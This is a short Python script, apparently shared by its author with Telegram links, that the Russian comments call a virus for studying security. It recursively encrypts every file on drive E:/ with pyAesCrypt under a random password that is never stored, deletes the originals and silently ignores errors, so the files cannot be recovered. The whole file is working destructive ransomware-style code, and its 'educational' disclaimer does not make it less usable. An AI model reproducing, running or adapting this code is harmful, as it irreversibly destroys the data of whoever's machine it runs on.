# projected by egoriwe999
# my telegram - https://t.me/egoriwe999
# my telegram channel -  https://t.me/whitehacker999

# Данный вирус написан и опубликован с целью изучения компьютерной безопасности.
# Не запускать на своем устройсве , рекомендую запускать на виртуальной машине\песочнице


import random
import os
import threading
from multiprocessing import Process
import pyAesCrypt # Данный модуль необходимо скачать (pip3 install pyAesCrypt)

# Диски которые будут шифроваться , вы их можете зашифровать сколько угодно , искользуем dir_(Диск)
dir_e = 'E:/'
dir_f = 'F:/'

# Символы, цифры и буквы для ввода пароля
chars = '+-/*!@#$&=<>abcdifghijklmnopqrstuvwxyzABCDIFGHIJKLMNOPQRSTUVWXYZ1234567890'

# Генерируем наш пароль
def generate_pass():
    password = 'egoriwe999'
    for i in range(128):
        password += random.choice(chars)
    return password

# Теперь переходим к шифрованию
def crypt_file(file, password):
    try:
        bufferSize = 512 * 1024
        pyAesCrypt.encryptFile(str(file), str(file) + ".zvp",
                               password, bufferSize)
        os.remove(file)
    except:
        pass

# Проходимся по директориям дисков
def crypt_disk(dir, password):
    try:
        for file in os.listdir(dir):
            if os.path.isdir(dir + '\\' + file):
                crypt_disk(dir + '\\' + file, password)
            if os.path.isfile(dir + '\\' + file):
                try:
                    crypt_file(dir + '\\' + file, password)
                except:
                    pass
    except OSError:
        pass

# Потоки
def crypting(dir, password):
    pycrypt = threading.Thread(target=crypt_disk, args=(dir, password))
    pycrypt.start()

# Используем процессы
def crypting(dir, password):
    pycrypt = Process(target=crypt_disk, args=(dir, password))
    pycrypt.start()

try:
    crypting(dir_e, password=generate_pass())
    #crypting(dir_f, password=generate_pass())
    crypt_disk(dir_e, password=generate_pass()) # запускаем без потоков и процессов
    #crypt_disk(dir_f, password=generate_pass()) # диски будут шифроваться по очереди
except Exception as e:
    pass